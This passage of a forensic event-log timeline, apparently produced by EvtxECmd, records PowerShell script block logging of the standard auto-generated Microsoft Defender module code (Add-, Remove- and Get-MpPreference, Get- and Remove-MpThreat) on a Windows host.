$__cmdletization_defaultValue; IsValueP...[truncated]",,4104,,DESKTOP-704R550,,,,,,,EventLogs/20250503043822_EvtxECmd_Output.csv,
2025-05-03T04:01:02.0549152,Event Time,Event Logs,EZ Tools,Contains contents of scripts run,Microsoft-Windows-PowerShell/Operational,"Channel: Microsoft-Windows-PowerShell/Operational | Computer: DESKTOP-704R550 | Path:  | ScriptBlockText: meter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessAllowedApplications'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessAllowedApplications'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('ControlledFolderAccessProtectedFolders')) {,           [object]$__cmdletization_value = ${ControlledFolderAccessProtectedFolders},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessProtectedFolders'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessProtectedFolders'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('AttackSurfaceReductionRules_Ids')) {,           [object]$__cmdletization_value = ${AttackSurfaceReductionRules_Ids},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Ids'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Ids'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('AttackSurfaceReductionRules_Actions')) {,           [object]$__cmdletization_value = ${AttackSurfaceReductionRules_Actions},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Actions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Actions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('Force')) {,           [object]$__cmdletization_value = ${Force},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:operationOption:Force'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:operationOption:Force'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),       $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false },       $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Add', $__cmdletization_methodParameters, $__cmdletization_returnValue),       $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo),             },         },         catch,         {,             $__cmdletization_exceptionHasBeenThrown = $true,             throw,         },     },         ,     End {,         try,         {,             if (-not $__cmdletization_exceptionHasBeenThrown),             {,                 $__cmdletization_objectModelWrapper.EndProcessing(),             },         },         catch,         {,             throw,         },     },     # .EXTERNALHELP MSFT_MpPreference.cdxml-Help.xml, }, Microsoft.PowerShell.Core/Export-ModuleMember -Function 'Add-MpPreference' -Alias '*',         , function Remove-MpPreference, {,     [CmdletBinding(PositionalBinding=$false)],     ,     ,     param(,     ,     [Parameter(ParameterSetName='Remove2')],     [Alias('ssp','SecurityIntelligenceLocation','ssl')],     [string],     ${SharedSignaturesPath},,     [Parameter(ParameterSetName='Remove2')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [string[]],     ${ExclusionPath},,     [Parameter(ParameterSetName='Remove2')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [string[]],     ${ExclusionExtension},,     [Parameter(ParameterSetName='Remove2')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [string[]],     ${ExclusionProcess},,     [Parameter(ParameterSetName='Remove2')],     [Alias('tiddefaci')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [long[]],     ${ThreatIDDefaultAction_Ids},,     [Parameter(ParameterSetName='Remove2')],     [Alias('unktdefac')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [switch],     ${UnknownThreatDefaultAction},,     [Parameter(ParameterSetName='Remove2')],     [Alias('ltdefac')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [switch],     ${LowThreatDefaultAction},,     [Parameter(ParameterSetName='Remove2')],     [Alias('mtdefac')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [switch],     ${ModerateThreatDefaultAction},,     [Parameter(ParameterSetName='Remove2')],     [Alias('htdefac')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [switch],     ${HighThreatDefaultAction},,     [Parameter(ParameterSetName='Remove2')],     [Alias('stdefac')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [switch],     ${SevereThreatDefaultAction},,     [Parameter(ParameterSetName='Remove2')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [string[]],     ${AttackSurfaceReductionOnlyExclusions},,     [Parameter(ParameterSetName='Remove2')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [string[]],     ${ControlledFolderAccessAllowedApplications},,     [Parameter(ParameterSetName='Remove2')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [string[]],     ${ControlledFolderAccessProtectedFolders},,     [Parameter(ParameterSetName='Remove2')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [string[]],     ${AttackSurfaceReductionRules_Ids},,     [Parameter(ParameterSetName='Remove2')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType[]],     ${AttackSurfaceReductionRules_Actions},,     [Parameter(ParameterSetName='Remove2')],     [switch],     ${Force},,     [Parameter(ParameterSetName='Remove2')],     [Alias('Session')],     [ValidateNotNullOrEmpty()],     [CimSession[]],     ${CimSession},,     [Parameter(ParameterSetName='Remove2')],     [int],     ${ThrottleLimit},,     [Parameter(ParameterSetName='Remove2')],     [switch],     ${AsJob}),     DynamicParam {,         try ,         {,             if (-not $__cmdletization_exceptionHasBeenThrown),             {,                 $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new(),                 $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData),                 if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters]),                 {,                     ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters(),                 },             },         },         catch,         {,             $__cmdletization_exceptionHasBeenThrown = $true,             throw,         },     },     Begin {,         $__cmdletization_exceptionHasBeenThrown = $false,         try ,         {,             __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters,             $__cmdletization_objectModelWrapper.BeginProcessing(),         },         catch,         {,             $__cmdletization_exceptionHasBeenThrown = $true,             throw,         },     },         ,     Process {,         try ,         {,             if (-not $__cmdletizatio...[truncated]",,4104,,DESKTOP-704R550,,,,,,,EventLogs/20250503043822_EvtxECmd_Output.csv,
2025-05-03T04:01:02.0549290,Event Time,Event Logs,EZ Tools,Contains contents of scripts run,Microsoft-Windows-PowerShell/Operational,"Channel: Microsoft-Windows-PowerShell/Operational | Computer: DESKTOP-704R550 | Path:  | ScriptBlockText: ath'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionPath'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('ExclusionExtension')) {,           [object]$__cmdletization_value = ${ExclusionExtension},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionExtension'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionExtension'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('ExclusionProcess')) {,           [object]$__cmdletization_value = ${ExclusionProcess},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionProcess'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionProcess'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('ThreatIDDefaultAction_Ids')) {,           [object]$__cmdletization_value = ${ThreatIDDefaultAction_Ids},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Ids'; ParameterType = 'System.Int64[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Ids'; ParameterType = 'System.Int64[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('UnknownThreatDefaultAction')) {,           [object]$__cmdletization_value = ${UnknownThreatDefaultAction},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'UnknownThreatDefaultAction'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'UnknownThreatDefaultAction'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('LowThreatDefaultAction')) {,           [object]$__cmdletization_value = ${LowThreatDefaultAction},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LowThreatDefaultAction'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LowThreatDefaultAction'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('ModerateThreatDefaultAction')) {,           [object]$__cmdletization_value = ${ModerateThreatDefaultAction},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ModerateThreatDefaultAction'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ModerateThreatDefaultAction'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('HighThreatDefaultAction')) {,           [object]$__cmdletization_value = ${HighThreatDefaultAction},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'HighThreatDefaultAction'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'HighThreatDefaultAction'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('SevereThreatDefaultAction')) {,           [object]$__cmdletization_value = ${SevereThreatDefaultAction},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SevereThreatDefaultAction'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SevereThreatDefaultAction'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('AttackSurfaceReductionOnlyExclusions')) {,           [object]$__cmdletization_value = ${AttackSurfaceReductionOnlyExclusions},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionOnlyExclusions'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionOnlyExclusions'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('ControlledFolderAccessAllowedApplications')) {,           [object]$__cmdletization_value = ${ControlledFolderAccessAllowedApplications},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessAllowedApplications'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessAllowedApplications'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),    ...[truncated]",,4104,,DESKTOP-704R550,,,,,,,EventLogs/20250503043822_EvtxECmd_Output.csv,
2025-05-03T04:01:02.0549357,Event Time,Event Logs,EZ Tools,Contains contents of scripts run,Microsoft-Windows-PowerShell/Operational,"Channel: Microsoft-Windows-PowerShell/Operational | Computer: DESKTOP-704R550 | Path:  | ScriptBlockText: aluePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Ids'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('AttackSurfaceReductionRules_Actions')) {,           [object]$__cmdletization_value = ${AttackSurfaceReductionRules_Actions},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Actions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Actions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('Force')) {,           [object]$__cmdletization_value = ${Force},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:operationOption:Force'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:operationOption:Force'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),       $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false },       $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Remove', $__cmdletization_methodParameters, $__cmdletization_returnValue),       $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo),             },         },         catch,         {,             $__cmdletization_exceptionHasBeenThrown = $true,             throw,         },     },         ,     End {,         try,         {,             if (-not $__cmdletization_exceptionHasBeenThrown),             {,                 $__cmdletization_objectModelWrapper.EndProcessing(),             },         },         catch,         {,             throw,         },     },     # .EXTERNALHELP MSFT_MpPreference.cdxml-Help.xml, }, Microsoft.PowerShell.Core/Export-ModuleMember -Function 'Remove-MpPreference' -Alias '*',         , function Get-MpPreference, {,     [CmdletBinding(DefaultParameterSetName='DefaultSet', PositionalBinding=$false)],     ,     [OutputType([Microsoft.Management.Infrastructure.CimInstance])], [OutputType('Microsoft.Management.Infrastructure.CimInstance#root/Microsoft/Windows/Defender/MSFT_MpPreference')],     param(,     ,     [Alias('Session')],     [ValidateNotNullOrEmpty()],     [CimSession[]],     ${CimSession},,     [int],     ${ThrottleLimit},,     [switch],     ${AsJob}),     DynamicParam {,         try ,         {,             if (-not $__cmdletization_exceptionHasBeenThrown),             {,                 $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new(),                 $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData),                 if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters]),                 {,                     ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters(),                 },             },         },         catch,         {,             $__cmdletization_exceptionHasBeenThrown = $true,             throw,         },     },     Begin {,         $__cmdletization_exceptionHasBeenThrown = $false,         try ,         {,             __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters,             $__cmdletization_objectModelWrapper.BeginProcessing(),         },         catch,         {,             $__cmdletization_exceptionHasBeenThrown = $true,             throw,         },     },         ,     Process {,         try ,         {,             if (-not $__cmdletization_exceptionHasBeenThrown),             {,     $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder(),     $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder),             },         },         catch,         {,             $__cmdletization_exceptionHasBeenThrown = $true,             throw,         },     },         ,     End {,         try,         {,             if (-not $__cmdletization_exceptionHasBeenThrown),             {,                 $__cmdletization_objectModelWrapper.EndProcessing(),             },         },         catch,         {,             throw,         },     },     # .EXTERNALHELP MSFT_MpPreference.cdxml-Help.xml, }, Microsoft.PowerShell.Core/Export-ModuleMember -Function 'Get-MpPreference' -Alias '*',         ,",,4104,,DESKTOP-704R550,,,,,,,EventLogs/20250503043822_EvtxECmd_Output.csv,
2025-05-03T04:01:02.1458631,Event Time,Event Logs,EZ Tools,Contains contents of scripts run,Microsoft-Windows-PowerShell/Operational,"Channel: Microsoft-Windows-PowerShell/Operational | Computer: DESKTOP-704R550 | Path:  | ScriptBlockText: , #requires -version 3.0, try { Microsoft.PowerShell.Core/Set-StrictMode -Off } catch { }, $script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module, $script:ClassName = 'ROOT/Microsoft/Windows/Defender/MSFT_MpThreat', $script:ClassVersion = '1.0', $script:ModuleVersion = '1.0', $script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter], $script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new(), Microsoft.PowerShell.Core/Export-ModuleMember -Function @(),         , function __cmdletization_BindCommonParameters, {,     param(,         $__cmdletization_objectModelWrapper,,         $myPSBoundParameters,     )       ,                 ,         if ($myPSBoundParameters.ContainsKey('CimSession')) { ,             $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] ,         },                     ,         if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { ,             $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] ,         },                     ,         if ($myPSBoundParameters.ContainsKey('AsJob')) { ,             $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] ,         },                     , },                 , function Remove-MpThreat, {,     [CmdletBinding(PositionalBinding=$false)],     ,     ,     param(,     ,     [Parameter(ParameterSetName='Remove0')],     [Alias('Session')],     [ValidateNotNullOrEmpty()],     [CimSession[]],     ${CimSession},,     [Parameter(ParameterSetName='Remove0')],     [int],     ${ThrottleLimit},,     [Parameter(ParameterSetName='Remove0')],     [switch],     ${AsJob}),     DynamicParam {,         try ,         {,             if (-not $__cmdletization_exceptionHasBeenThrown),             {,                 $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new(),                 $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData),                 if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters]),                 {,                     ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters(),                 },             },         },         catch,         {,             $__cmdletization_exceptionHasBeenThrown = $true,             throw,         },     },     Begin {,         $__cmdletization_exceptionHasBeenThrown = $false,         try ,         {,             __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters,             $__cmdletization_objectModelWrapper.BeginProcessing(),         },         catch,         {,             $__cmdletization_exceptionHasBeenThrown = $true,             throw,         },     },         ,     Process {,         try ,         {,             if (-not $__cmdletization_exceptionHasBeenThrown),             {,       $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new(),       $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false },       $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Remove', $__cmdletization_methodParameters, $__cmdletization_returnValue),       $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo),             },         },         catch,         {,             $__cmdletization_exceptionHasBeenThrown = $true,             throw,         },     },         ,     End {,         try,         {,             if (-not $__cmdletization_exceptionHasBeenThrown),             {,                 $__cmdletization_objectModelWrapper.EndProcessing(),             },         },         catch,         {,             throw,         },     },     # .EXTERNALHELP MSFT_MpThreat.cdxml-Help.xml, }, Microsoft.PowerShell.Core/Export-ModuleMember -Function 'Remove-MpThreat' -Alias '*',         , function Get-MpThreat, {,     [CmdletBinding(DefaultParameterSetName='DefaultSet', PositionalBinding=$false)],     ,     [OutputType([Microsoft.Management.Infrastructure.CimInstance])], [OutputType('Microsoft.Management.Infrastructure.CimInstance#ROOT/Microsoft/Windows/Defender/MSFT_MpThreat')],     param(,     ,     [Parameter(ParameterSetName='ById')],     [Alias('ID')],     [ValidateNotNull()],     [long[]],     ${ThreatID},,     [Parameter(ParameterSetName='ById')],     [Alias('Session')],     [ValidateNotNullOrEmpty()],     [CimSession[]],     ${CimSession},,     [Parameter(ParameterSetName='ById')],     [int],     ${ThrottleLimit},,     [Parameter(ParameterSetName='ById')],     [switch],     ${AsJob}),     DynamicParam {,         try ,         {,             if (-not $__cmdletization_exceptionHasBeenThrown),             {,                 $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new(),                 $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData),                 if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters]),                 {,                     ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters(),                 },             },         },         catch,         {,             $__cmdletization_exceptionHasBeenThrown = $true,             throw,         },     },     Begin {,         $__cmdletization_exceptionHasBeenThrown = $false,         try ,         {,             __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters,             $__cmdletization_objectModelWrapper.BeginProcessing(),         },         catch,         {,             $__cmdletization_exceptionHasBeenThrown = $true,             throw,         },     },         ,     Process {,         try ,         {,             if (-not $__cmdletization_exceptionHasBeenThrown),             {,     $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder(),     if ($PSBoundParameters.ContainsKey('ThreatID') -and (@('ById') -contains $PSCmdlet.ParameterSetName )) {,         $__cmdletization_values = @(${ThreatID}),         $__cmdletization_queryBuilder.FilterByProperty('ThreatID', $__cmdletization_values, $false, 'Default'),     },     $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder),             },         },         catch,         {,             $__cmdletization_exceptionHasBeenThrown = $true,             throw,         },     },         ,     End {,         try,         {,             if (-not $__cmdletization_exceptionHasBeenThrown),             {,                 $__cmdletization_objectModelWrapper.EndProcessing(),             },         },         catch,         {,             throw,         },     },     # .EXTERNALHELP MSFT_MpThreat.cdxml-Help.xml, }, Microsoft.PowerShell.Core/Export-ModuleMember -Function 'Get-MpThreat' -Alias '*',         